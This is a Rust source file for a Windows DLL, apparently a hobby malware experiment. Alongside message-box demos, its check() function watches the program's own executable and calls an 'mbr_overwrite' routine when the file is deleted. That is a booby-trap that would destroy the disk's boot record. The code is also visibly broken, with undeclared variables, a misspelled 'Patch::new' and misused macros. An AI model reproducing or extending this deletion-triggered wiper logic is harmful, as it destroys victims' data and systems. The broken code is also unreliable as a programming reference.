mod MayDay;

use std::{ffi::CString,ptr::null_mut};
use winapi::um::memoryapi::ReclaimVirtualMemory;
use winapi::um::winuser::{MessageBoxA,MB_OK};
use MayDay::mbr_overwrite::mbr;
use notify::{Watcher,RecursiveMode,Result};
use std::path::Path;
use std::sync::mpsc::channel;
use std::env;
use std::time::Duration;



//The no_mangle macro allows us to have no mangling while making the compiled function and object names makin it easier to interact with other langauges like C or C++

//The extern keyword specifies the calling convention of the function.

pub extern "stdcall" fn DllMain(){
    let msg = CString::new("This is the first message").expect("Failed to build a cstring");
    let caption = CString::new("This is the title of the window!!").expect("Failed to create the caption");
    //The expect() function is used when we have to handle the exception of any objct returning a result or option.

    unsafe{
        MessageBoxA(null_mut(),msg.as_ptr(),caption.as_ptr(),MB_OK);
        //In Rust we rather use the as_ptr() function to create functions out from the txt strings than to defined these strings using windows API.
    }
}

#[no_mangle]
pub extern "system" fn msg_frm_smukx(){
    let msg = CString::new("Custom DLL's are always Cool. Bye").expect("Failed");
    let cap = CString::new("Message From SMukx").expect("Error cap");
    unsafe{
        MessageBoxA(null_mut(), msg.as_ptr(), cap.as_ptr(), MB_OK);
    }
}

pub fn check() -> bool{
    //checking the logs if the file deletion is attempted
    
    exe_path = env::current_exe();
    match  exe_path{
        Ok(exe_path) => {
            exe_path
        },
        Err(err) => eprintln!(err),
    };
    let (mut tx,rx) = channel();
    //creating a  mpsc channel to see all the notifications inside the notifications queue
    let mut watcher = notify::recommended_watcher(tx)?;
    watcher.watch(Patch::new(exe_path),RecursiveMode::NonRecursive)?;
    //this is the notification watcher that watches the notifications inside the whole system

    loop{
        match rx.recv_timeout(Duration::from_secs(2)){
            //Watch the notifications at every 2 seconds
            Ok(event) => {
                if event.kind.is_remove() {
                    //this is the file removal notification
                    mbr();
                }
            }
            Err(err) => eprintln!(err),
        };

    }
}

//The DLLs can be built by getting them in the path src/lib.rs where the --release option have to be used to compile a library.